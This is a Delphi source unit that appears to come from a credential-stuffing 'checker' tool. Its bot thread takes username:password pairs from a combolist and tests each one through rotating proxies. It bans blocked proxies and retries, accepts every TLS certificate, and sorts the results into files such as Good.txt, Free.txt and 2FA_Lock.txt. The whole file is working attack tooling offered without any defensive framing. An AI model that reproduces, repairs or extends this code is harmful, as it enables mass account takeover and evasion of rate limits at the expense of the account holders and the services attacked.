unit uThread;

interface

uses ipwhttp, Classes, uCombolist, uProxylist, uTypes;

type
  TBotThread = class(TThread)
  protected
    FID: Integer;
    FHttp: TipwHTTP;
    FTimeout: Integer;
    FProxyType: Integer;
    FCombolist: TCombolist;
    FProxylist: TProxylist;
    FBotProc: TBotThreadProc;
    FStatistics: PStatistics;
    FSettings: PBruteforceSettings;
    FOnComboChecked: TNotifyEvent;
    FOnUpdateListView: TProcUpdateListView;
    procedure TriggerComboChecked;
    procedure SetProxy;
    procedure TriggerUpdateListView(const Username, Password: string;
      const Proxy: string; const Status: string);
    procedure ipwHTTP1SSLServerAuthentication(Sender: TObject;
      CertEncoded: string; CertEncodedB: TArray<System.Byte>;
      const CertSubject, CertIssuer, Status: string; var Accept: Boolean);
    procedure Execute; override;
  public
    property ID: Integer read FID write FID;
    property Combolist: TCombolist read FCombolist write FCombolist;
    property Proxylist: TProxylist read FProxylist write FProxylist;
    property ProxyType: Integer read FProxyType write FProxyType;
    property BotProc: TBotThreadProc read FBotProc write FBotProc;
    property Settings: PBruteforceSettings read FSettings write FSettings;
    property Http: TipwHTTP read FHttp write FHttp;
    property Timeout: Integer read FTimeout write FTimeout;
    property Statistics: PStatistics read FStatistics write FStatistics;
    property OnComboChecked: TNotifyEvent read FOnComboChecked
      write FOnComboChecked;
    property OnUpdateListView: TProcUpdateListView read FOnUpdateListView
      write FOnUpdateListView;
  end;

implementation

uses SysUtils, Windows, uFunctions, DateUtils, uFrmMain;

procedure WriteErrorLog(const fileName, msg: string);
var
  tf: TextFile;
begin
  AssignFile(tf, MainForm.StrLocPath + fileName);
  Append(tf);
  try
    WriteLn(tf, '========================== Log ==========================');
    WriteLn(tf, 'Date: ' + DateToStr(Now));
    WriteLn(tf, 'Error Message:');
    WriteLn(tf, msg);
  finally
    CloseFile(tf);
  end;
end;

{ TBotThread }

procedure TBotThread.Execute;
var
  Capture: TStringList;
  Status: TStatus;
  ComboUsername: string;
  ComboPassword: string;
label RetryLabel;
begin
  FreeOnTerminate := True;

  FHttp := TipwHTTP.Create(nil);
  FHttp.Timeout := FTimeout;
  FHttp.Config('KeepAlive=True');
  FHttp.OnSSLServerAuthentication := ipwHTTP1SSLServerAuthentication;

  Capture := TStringList.Create;
  try
    // main loop,
    while (FSettings.Position < FCombolist.Count) and (not Terminated) do
    begin
      // set combo
      EnterCriticalSection(FSettings.LockCombo);
      try
        with FCombolist[FSettings.Position] do
        begin
          ComboUsername := Username;
          ComboPassword := Password;
        end;
        Inc(FSettings.Position);
      finally
        LeaveCriticalSection(FSettings.LockCombo);
      end;
RetryLabel:
      // set proxy
      EnterCriticalSection(FSettings.LockProxy);
      try
        self.SetProxy;
      finally
        LeaveCriticalSection(FSettings.LockProxy);
      end;

      if Terminated then
        break;

      Status := stBad;
      Capture.Clear;
      // check credentials
      if Assigned(FBotProc) then
        FBotProc(FHttp, ComboUsername, ComboPassword, Status, Capture);

      // update stats
      EnterCriticalSection(FSettings.LockStatus);
      try
        if not (Status in [stBan, stRetry]) then
          Inc(FStatistics.Tested);

        case Status of
          stHit:
            Inc(FStatistics.Hit);
          stBad:
            Inc(FStatistics.Bad);
          stBan:
            Inc(FStatistics.Ban);
          stFree:
            Inc(FStatistics.Free);
          stRetry:
            Inc(FStatistics.Retry);
          stUnkown:
            Inc(FStatistics.Uknown);
          st2Fa:
            Inc(FStatistics.TwoFa);
        end;
        FStatistics.CPM := FStatistics.Tested div
          (((GetTickCount64 - FSettings.StartTime) div 60000) + 1);
      finally
        LeaveCriticalSection(FSettings.LockStatus);
      end;

      // trigger done
      Synchronize(TriggerComboChecked);

      // Synchronize(TriggerUpdateListView(ComboUsername, ComboPassword,
      // FProxylist[FHttp.Tag].WriteToString,
      // 'Checked combo status: Good'));

      // ban unworking proxy
      EnterCriticalSection(FSettings.LockProxy);
      try
        if Status = stBan then
          FProxylist.BanProxy(FHttp.Tag);
      finally
        LeaveCriticalSection(FSettings.LockProxy);
      end;
      // save hit free to check etc

      if (Status in [stBan, stRetry]) then
        goto RetryLabel;
      EnterCriticalSection(FSettings.LockCheck);
      try
        if Status = stHit then
          WriteHitToTextFile(FSettings.ResultDir + 'Good.txt', ComboUsername,
            ComboPassword, FProxylist[FHttp.Tag].WriteToString, Capture)
        else if Status = stFree then
          WriteLintToTextFile(FSettings.ResultDir + 'Free.txt',
            ComboUsername + ':' + ComboPassword + '| Proxy:' + ' | Capture:' +
            Capture.Text, True)
        else if Status = st2Fa then
          WriteLintToTextFile(FSettings.ResultDir + '2FA_Lock.txt',
            ComboUsername + ':' + ComboPassword + '| Proxy:' + ' | Capture:' +
            Capture.Text, True)
        else if Status = stUnkown then
          WriteLintToTextFile(FSettings.ResultDir + 'ToCheck.txt',
            'Combo: ' + ComboUsername + ':' + ComboPassword + #10 +
            'Last Status: ' + FHttp.StatusLine + #10 + 'Headers: ' + #10 +
            FHttp.TransferredHeaders + #10 + 'Response Body:' +
            FHttp.TransferredData + #10 +
            '====================================', True)
        else if Status = stBad then
          WriteLintToTextFile(FSettings.ResultDir + 'Bad.txt',
            ComboUsername + ':' + ComboPassword, True);
      finally
        LeaveCriticalSection(FSettings.LockCheck);
      end;
    end;
  finally
    FHttp.Free;
    Capture.Free;
  end;
end;

procedure TBotThread.ipwHTTP1SSLServerAuthentication(Sender: TObject;
  CertEncoded: string; CertEncodedB: TArray<System.Byte>;
  const CertSubject, CertIssuer, Status: string; var Accept: Boolean);
begin
  Accept := True;
end;

procedure TBotThread.SetProxy;
begin
  // clean current used proxy
  FHttp.FirewallHost := '';
  FHttp.FirewallUser := '';
  FHttp.FirewallPassword := '';
  FHttp.FirewallType := TipwhttpFirewallTypes.fwNone;
  repeat
    // check position and active
    if FSettings.ProxyPosition >= FProxylist.Count - 1 then
      FSettings.ProxyPosition := -1;
    if FProxylist.Active < 10 then
      FProxylist.ActivateAll;
    Inc(FSettings.ProxyPosition);
    with FProxylist[FSettings.ProxyPosition] do
    begin
      if Active then
      begin
        FHttp.FirewallHost := Host;
        FHttp.FirewallPort := StrToInt(Port);
        FHttp.FirewallUser := Username;
        FHttp.FirewallPassword := Password;
        case FProxyType of
          1:
            FHttp.FirewallType := TipwhttpFirewallTypes.fwSOCKS4;
          2:
            FHttp.FirewallType := TipwhttpFirewallTypes.fwSOCKS4;
        else
          FHttp.FirewallType := TipwhttpFirewallTypes.fwTunnel;
        end;
      end;
    end;
  until (FHttp.FirewallHost <> '') or Terminated;
  FHttp.Tag := FSettings.ProxyPosition;
end;

procedure TBotThread.TriggerComboChecked;
begin
  if Assigned(FOnComboChecked) then
    FOnComboChecked(self);
end;

procedure TBotThread.TriggerUpdateListView(const Username, Password, Proxy,
  Status: string);
begin
  if Assigned(FOnUpdateListView) then
    FOnUpdateListView(self, Username, Password, Proxy, Status);
end;

end.
